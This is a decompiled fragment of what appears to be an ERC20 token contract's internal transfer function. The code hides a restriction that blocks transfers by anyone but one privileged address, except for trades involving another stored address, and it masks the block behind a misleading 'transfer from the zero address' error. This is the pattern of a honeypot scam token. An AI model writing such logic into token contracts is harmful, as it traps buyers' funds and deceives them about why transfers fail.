function 0xf6e(uint256 varg0, uint256 varg1, uint256 varg2) private { 

    require(address(varg2) != 0, Error('ERC20: transfer from the zero address'));

    require(address(varg1) != 0, Error('ERC20: transfer to the zero address'));

    if (varg0 > 0) {

        v0 = v1 = address(varg1) != _sercs;

        if (v1) {

            v0 = v2 = address(varg2) != _sercs;

        }

        if (v0) {

            v0 = v3 = _sercs != __intsj;

        }

        if (v0) {

            require(address(varg2) == __intsj, Error('ERC20: transfer from the zero address'));

        }

    }

    v4 = new struct(3);

    v4.word0 = 38;

    v5 = address(varg2);

    v6 = _SafeSub(v4, varg0, _balanceOf[v5]);

    v7 = address(varg2);

    _balanceOf[v7] = v6;

    v8 = address(varg1);

    v9 = _balanceOf[v8] + varg0;

    require(v9 >= _balanceOf[v8], Error('SafeMath: addition overflow'));

    v10 = address(varg1);

    _balanceOf[v10] = v9;

    emit Transfer(address(varg2), address(varg1), varg0);

    return ;

}
